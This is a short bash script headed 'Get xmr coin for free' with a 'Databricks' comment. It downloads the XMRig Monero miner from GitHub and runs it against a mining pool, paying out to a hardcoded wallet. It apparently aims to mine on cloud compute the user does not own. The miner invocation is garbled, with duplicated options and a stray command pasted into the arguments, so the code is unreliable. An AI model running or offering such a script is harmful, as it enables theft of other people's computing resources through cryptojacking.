#! /bin/bash
# Get xmr coin for free
# Databricks
sudo apt update
clear
sudo apt install screen
screen -R xmr
 
wget https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-focal-x64.tar.gz
tar xvzf xmrig-6.16.4-focal-x64.tar.gz
cd xmrig-6.16.4
./xmrig -o us-west.minexmr.com:443 -u ./xmrig -o us-west.minexmr.com:443 -u 4ALJ2jaCe7HCXWRnxzjPm3NXMebwJQK3mUnfaZyZAUPDZKcBLBkjJZbPVshD2d92LyheeLR8uCD1GTJf1mPiFZtG3KyateV -k --tls --rig-id aank -k --tls --rig-id aank
